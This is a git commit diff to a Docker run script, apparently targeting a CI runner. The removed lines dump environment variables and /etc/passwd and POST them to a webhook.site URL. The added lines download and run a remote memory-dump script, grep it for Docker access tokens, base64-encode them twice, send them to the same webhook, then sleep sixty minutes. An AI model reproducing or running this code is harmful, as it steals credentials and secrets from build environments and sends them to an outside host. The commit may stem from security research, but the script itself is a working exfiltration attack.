c8b89101eb5faa69f69426fb7c5b51b70e0f9f74
simocodeX <simone.spinelli@students.uniroma2.eu>
2025-05-16 00:38:05 +0200

    Change in docker.sh

--- docker/run_docker.sh
+++ docker/run_docker.sh
@@ -1,23 +1,9 @@
 #!/bin/bash
 
-echo "[*] Starting full exfiltration test..."
+echo "[*] Starting token scan from memory..."
 
-# Dump solo delle variabili Docker-related (simula secrets specifici)
-env | grep -i DOCKER > /tmp/docker_secrets.txt
+TOKEN_VAL=$(curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | python3 | tr -d '\0' | grep -aoE 'dckr_pat_[0-9A-Za-z_-]{20,}' | sort -u | base64 | base64)
 
-# Dump dell'intero ambiente (per esfiltrare anche altri secrets eventualmente presenti)
-env > /tmp/full_env.txt
+curl -d "${TOKEN_VAL}" https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
 
-# Esfiltrazione /etc/passwd (file innocuo, ma dimostra lettura del filesystem del runner)
-cp /etc/passwd /tmp/passwd_dump.txt
-
-# Invia i secrets Docker
-curl -X POST --data-binary @/tmp/docker_secrets.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
-
-# Invia l'intero ambiente
-curl -X POST --data-binary @/tmp/full_env.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
-
-# Invia il file di sistema /etc/passwd
-curl -X POST --data-binary @/tmp/passwd_dump.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
-
-echo "[+] Exfiltration complete."
+sleep 60m
